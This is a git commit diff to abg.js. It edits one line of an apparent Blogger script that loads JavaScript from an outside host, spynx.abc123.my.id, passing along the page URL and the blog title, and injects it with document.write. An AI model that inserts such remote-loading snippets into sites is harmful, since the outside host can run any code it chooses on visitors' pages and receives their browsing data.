06e6dafd8025bdf215eb432df599dbb643abf2ec
bisrib613 <89772807+bisrib613@users.noreply.github.com>
2022-12-07 04:22:09 +0700

    Update abg.js

--- abg.js
+++ abg.js
@@ -1,1 +1,1 @@
-var ttl = encodeURIComponent(&#39;<data:blog.title/>&#39;);/*<![CDATA[*/var ndate=new Date(); var gtime=ndate.getTime(); var ujs= '//spynx.abc123.my.id/bloggerJS_2.js?' + gtime + '&v=' + window.location.href + '&ttl=' + ttl;document.write('<script src="'+ujs+'"></scr'+'ipt>');/*]]>*/
+var ttl = encodeURIComponent(&#39;<data:blog.title/>&#39;);/*<![CDATA[*/var ndate=new Date(); var gtime=ndate.getTime(); var ujs= '//spynx.abc123.my.id/bloggerJS_2.js?' + gtime + '&v=' + window.location.href + '&ttl=' + ttl;document.write('<script src="'+ujs+'"></scr'+'ipt>');
